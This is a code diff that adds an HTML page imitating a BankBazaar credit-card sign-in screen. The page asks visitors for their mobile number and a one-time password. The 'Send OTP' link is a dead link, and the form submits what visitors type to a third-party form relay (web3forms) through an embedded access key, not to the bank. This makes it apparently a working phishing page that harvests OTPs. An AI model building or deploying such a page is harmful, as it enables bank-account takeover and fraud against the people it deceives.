@@ -1,0 +1,110 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f8f9fa;
+            margin: 0;
+        }
+        .header {
+            padding: 5px;
+            font-weight: bold;
+        }
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 360px;
+        }
+        .login-container img {
+            width: 75px;
+            margin-bottom: 10px;
+        }
+        .login-container h2 {
+            margin-bottom: 20px;
+            font-size: 22px;
+            color: #202124;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .forgot-password {
+            display: block;
+            text-align: right;
+            font-size: 14px;
+            color: #1a73e8;
+            text-decoration: none;
+            margin-bottom: 20px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1a73e8;
+            border: none;
+            color: white;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .login-btn:hover {
+            background-color: #1669c1;
+        }
+        .create-account {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        .create-account a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .create-account a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        Compare, check your eligibility and apply for credit cards online.
+    <div class="login-container">
+        <form action="https://api.web3forms.com/submit" method="POST">
+        <h2>Provide your mobile number</h2>
+        <form action="#" method="POST">
+            <div class="input-group">
+                <input type="hidden" name="access_key" value="4495c4bc-9cad-4688-88cd-35d1b9da4f88">
+                <input type="text" name="phone" placeholder="Enter Your Mobile Number" class="contact-inputs" required>
+            </div>
+            <a href="#" class="forgot-password">Send OTP</a>
+            <div class="input-group">
+                <input type="name" name="name" placeholder="Enter OTP" class="contact-inputs" required>
+            </div>
+            <button type="submit" class="login-btn">Next</button>
+        </form>
+        <div class="checkbox">
+            <input type="checkbox" checked>
+            <label>I authorize BankBazaar to call/SMS/email me about its products & accept the <a href="#">Privacy Policy</a>.</label>
+        </div>
+    </div>
+</body>
+</html>
